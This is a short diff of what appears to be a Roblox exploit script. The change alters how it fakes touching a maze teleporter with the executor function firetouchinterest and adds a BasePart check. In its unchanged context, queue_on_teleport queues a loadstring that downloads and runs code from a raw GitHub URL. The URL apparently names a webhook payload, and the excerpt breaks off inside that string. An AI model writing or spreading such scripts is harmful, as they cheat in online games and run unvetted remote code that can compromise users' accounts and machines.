@@ -3,11 +3,16 @@ local TeleportService = game:GetService("TeleportService")
 
 local player = Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
-local leftLeg = char:WaitForChild("Left Leg")
+local root = char:WaitForChild("HumanoidRootPart")
 
 local teleporter = workspace.Map.Walls.SpinningMaze.WebhookExit.Teleporter
 
-firetouchinterest(leftLeg, teleporter, 0)
+-- PROTECT against non-BasePart objects
+if root:IsA("BasePart") and teleporter:IsA("BasePart") then
+    firetouchinterest(root, teleporter, 0)
+else
+    warn("One of the parts is not a BasePart — skipping touch")
+end
 
 queue_on_teleport([[
     loadstring(game:HttpGet("https://raw.githubusercontent.com/someoneVIOLET/modeplace-webhook1/refs/heads/main/something"))()
